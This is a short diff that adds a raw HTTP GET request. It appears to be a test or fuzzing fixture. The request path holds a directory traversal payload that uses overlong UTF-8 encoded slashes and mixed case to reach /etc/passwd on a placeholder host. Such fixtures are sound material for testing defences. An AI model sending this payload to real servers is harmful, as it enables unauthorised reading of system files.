@@ -1,0 +1,4 @@
+GET /a?id=..%c0%Af..%C0%aFeTc/PaSsWd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
